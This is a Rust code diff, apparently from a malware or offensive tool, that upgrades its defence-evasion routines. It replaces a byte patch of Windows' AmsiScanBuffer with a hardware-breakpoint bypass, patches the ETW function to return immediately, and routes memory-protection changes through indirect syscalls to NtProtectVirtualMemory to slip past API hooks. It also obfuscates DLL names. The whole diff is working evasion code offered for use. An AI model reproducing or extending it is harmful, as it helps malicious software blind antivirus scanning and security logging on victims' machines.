@@ -7,6 +7,10 @@ use windows::Win32::System::Memory::{
 };
 use windows::core::PCWSTR;
 
+use crate::recovery::helpers::syscalls::{SyscallManager, indirect_syscall_5};
+
+use crate::recovery::helpers::hw_breakpoints::enable_hw_breakpoint;
+
 pub fn apply_evasion_techniques() {
     if !RecoveryControl::global().evasion_enabled() {
         debug!("evasion techniques are disabled");
@@ -15,20 +19,28 @@ pub fn apply_evasion_techniques() {
 
     info!("applying evasion and stealth techniques");
 
-    if let Err(err) = patch_amsi() {
+    let syscall_manager = match SyscallManager::new() {
+        Ok(m) => Some(m),
+        Err(e) => {
+            debug!(error = ?e, "failed to initialize syscall manager");
+            None
+        }
+    };
+
+    if let Err(err) = bypass_amsi() {
         debug!(error = ?err, "AMSI bypass failed");
     } else {
-        info!("AMSI bypass applied successfully");
+        info!("AMSI bypass applied successfully via HW BP");
     }
 
-    if let Err(err) = patch_etw() {
+    if let Err(err) = patch_etw(syscall_manager.as_ref()) {
         debug!(error = ?err, "ETW bypass failed");
     } else {
         info!("ETW bypass applied successfully");
     }
 }
 
-fn patch_amsi() -> Result<(), Box<dyn std::error::Error>> {
+fn bypass_amsi() -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
         // "amsi.dll"
         let amsi_name = deobf_w(&[0xDC, 0xD0, 0xCE, 0xD4, 0x93, 0xD9, 0xD1, 0xD1]);
@@ -48,13 +60,15 @@ fn patch_amsi() -> Result<(), Box<dyn std::error::Error>> {
             return Err("failed to find AmsiScanBuffer address".into());
         };
 
-        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
+        if !enable_hw_breakpoint(p_address as usize) {
+            return Err("failed to set hardware breakpoint for AMSI".into());
+        }
 
-        apply_patch(p_address as _, &patch)
+        Ok(())
     }
 }
 
-fn patch_etw() -> Result<(), Box<dyn std::error::Error>> {
+fn patch_etw(syscalls: Option<&SyscallManager>) -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
         // "ntdll.dll"
         let ntdll_name = deobf_w(&[0xD3, 0xC9, 0xD9, 0xD1, 0xD1, 0x93, 0xD9, 0xD1, 0xD1]);
@@ -76,27 +90,58 @@ fn patch_etw() -> Result<(), Box<dyn std::error::Error>> {
 
         let patch: [u8; 3] = [0x33, 0xC0, 0xC3];
 
-        apply_patch(p_address as _, &patch)
+        apply_patch(p_address as _, &patch, syscalls)
     }
 }
 
 fn apply_patch(
     p_address: *mut std::ffi::c_void,
     patch: &[u8],
+    syscalls: Option<&SyscallManager>,
 ) -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
         let mut old_protect = PAGE_PROTECTION_FLAGS::default();
-        VirtualProtect(
-            p_address,
-            patch.len(),
-            PAGE_EXECUTE_READWRITE,
-            &mut old_protect,
-        )?;
+        let mut size = patch.len();
+        let mut addr = p_address;
+
+        if let Some(mgr) = syscalls {
+            let status = indirect_syscall_5(
+                mgr.nt_protect_virtual_memory_ssn,
+                mgr.syscall_gadget,
+                -1, // Current process
+                &mut addr as *mut _ as isize,
+                &mut size as *mut _ as isize,
+                PAGE_EXECUTE_READWRITE.0 as isize,
+                &mut old_protect.0 as *mut _ as isize,
+            );
+            if status != 0 {
+                return Err(format!("NtProtectVirtualMemory failed with status 0x{:X}", status).into());
+            }
+        } else {
+            VirtualProtect(
+                p_address,
+                patch.len(),
+                PAGE_EXECUTE_READWRITE,
+                &mut old_protect,
+            )?;
+        }
 
         std::ptr::copy_nonoverlapping(patch.as_ptr(), p_address as *mut u8, patch.len());
 
         let mut temp = PAGE_PROTECTION_FLAGS::default();
-        VirtualProtect(p_address, patch.len(), old_protect, &mut temp)?;
+        if let Some(mgr) = syscalls {
+            indirect_syscall_5(
+                mgr.nt_protect_virtual_memory_ssn,
+                mgr.syscall_gadget,
+                -1,
+                &mut addr as *mut _ as isize,
+                &mut size as *mut _ as isize,
+                old_protect.0 as isize,
+                &mut temp.0 as *mut _ as isize,
+            );
+        } else {
+            VirtualProtect(p_address, patch.len(), old_protect, &mut temp)?;
+        }
 
         Ok(())
     }
